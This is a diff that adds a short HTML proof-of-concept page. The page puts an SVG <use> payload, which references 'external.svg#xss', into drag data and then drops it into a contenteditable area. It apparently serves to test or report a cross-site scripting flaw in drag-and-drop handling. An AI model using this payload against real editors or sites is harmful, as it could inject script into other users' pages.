@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<title>Drag And Drop Proof of Concept</title>
+<script>const payload = `
+  <svg><use xlink:href="external.svg#xss" /></svg>
+`;</script>
+<div
+  style="background:lightblue; padding: 2em; width:100px" 
+  draggable=true
+  ondragstart="event.dataTransfer.setData('text/html', payload)"
+>Drag me!</div>
+<div contenteditable style="border: 1px solid black; padding:2em; margin-top: 2em; height:200px">Drop here!</div>
